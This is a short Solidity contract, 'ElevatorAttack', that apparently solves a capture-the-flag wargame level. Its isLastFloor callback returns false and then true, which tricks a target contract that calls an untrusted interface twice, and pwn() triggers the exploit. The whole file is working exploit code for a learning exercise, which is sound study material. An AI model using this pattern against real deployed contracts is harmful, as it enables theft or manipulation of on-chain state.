// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    IElevator public target;
    bool public executed;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (executed) {
            return true;
        } else {
            executed = true;
            return false;
        }
    }

    function pwn() external {
        target.goTo(0);
    }
}
